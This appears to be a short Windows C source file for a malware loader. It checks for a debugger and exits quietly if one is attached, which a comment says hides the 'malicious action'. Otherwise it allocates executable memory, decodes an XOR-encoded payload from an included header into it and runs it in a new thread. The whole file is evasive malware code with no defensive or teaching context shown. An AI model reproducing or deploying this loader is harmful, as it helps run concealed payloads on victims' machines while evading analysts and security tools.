#include <windows.h>
#include "../common/payload_xor.h"
#include "../common/anti_debug.h"

int main() {
    /* If debugger is attached, exit cleanly without revealing malicious action */
    if (is_debugger_present_multi()) {
        return 0; // Benign graceful exit
    }

    PVOID base = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return 1;

    decode_payload(base);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    return 0;
}
